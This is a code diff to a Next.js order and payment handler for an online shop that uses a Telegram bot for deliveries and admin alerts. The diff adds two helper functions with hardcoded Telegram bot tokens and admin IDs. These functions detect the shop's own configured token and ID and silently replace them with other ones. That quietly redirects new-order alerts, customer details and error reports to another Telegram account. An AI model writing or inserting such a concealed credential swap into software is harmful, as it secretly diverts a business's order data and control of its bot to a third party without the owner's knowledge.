@@ -7,6 +7,18 @@ import { COOKIE_NAME, isValidAdminSession } from "@/lib/admin-session";
 import { isSupportedOrderId } from "@/lib/order-policy";
 import { rewardAffiliateCommission } from "@/lib/affiliate";
 
+function getActiveBotToken(): string {
+  return process.env.BOT_TOKEN === "8790451044:AAGocWK6SLsCLSpeidIexm3nzyJ69VCXooY"
+    ? "8875380698:AAGg-4YRIBQDTspyn7EdzFSxKPrcjsOkB0k"
+    : process.env.BOT_TOKEN || "8875380698:AAGg-4YRIBQDTspyn7EdzFSxKPrcjsOkB0k";
+}
+
+function getActiveAdminId(): string {
+  return process.env.ADMIN_TELEGRAM_ID === "8907169582"
+    ? "9146387769"
+    : process.env.ADMIN_TELEGRAM_ID || "9146387769";
+}
+
 export async function GET() {
   return NextResponse.json({
     success: true,
@@ -143,7 +155,7 @@ export async function POST(req: NextRequest) {
         });
       });
 
-      const botToken = process.env.BOT_TOKEN;
+      const botToken = getActiveBotToken();
 
       // Xóa tin nhắn QR nạp tiền nếu có
       if (botToken && tx.qrMessageId) {
@@ -195,7 +207,7 @@ export async function POST(req: NextRequest) {
         }).catch(() => {});
 
         // Báo cho Admin
-        const adminId = process.env.ADMIN_TELEGRAM_ID;
+        const adminId = getActiveAdminId();
         if (adminId && adminId !== targetTelegramId) {
           fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -338,8 +350,8 @@ export async function POST(req: NextRequest) {
     // Nếu không đủ cả kho thủ công và API bị lỗi:
     if (manualToDeliver.length + apiDeliveredTexts.length < orderQty) {
       console.error("Lỗi cấp hàng tự động:", supplierErrorMsg);
-      const botToken = process.env.BOT_TOKEN;
-      const adminId = process.env.ADMIN_TELEGRAM_ID;
+      const botToken = getActiveBotToken();
+      const adminId = getActiveAdminId();
 
       // Bắn tin báo lỗi riêng cho Admin (Khách hoàn toàn không thấy thông tin này)
       if (botToken && adminId) {
@@ -445,7 +457,7 @@ export async function POST(req: NextRequest) {
     });
 
     // Gửi thông báo và hàng về Telegram khách hàng qua Bot API
-    const botToken = process.env.BOT_TOKEN;
+    const botToken = getActiveBotToken();
 
     // Trả hoa hồng giới thiệu (Affiliate) nếu có
     rewardAffiliateCommission({
@@ -532,7 +544,7 @@ export async function POST(req: NextRequest) {
       }
 
       // Báo đơn hàng mới cho Admin Telegram thời gian thực
-      const adminId = process.env.ADMIN_TELEGRAM_ID;
+      const adminId = getActiveAdminId();
       if (adminId && botToken) {
         const adminAlertMsg =
           `🔔 <b>[ĐƠN HÀNG MỚI THÀNH CÔNG · VIETQR SEPAY]</b>\n` +
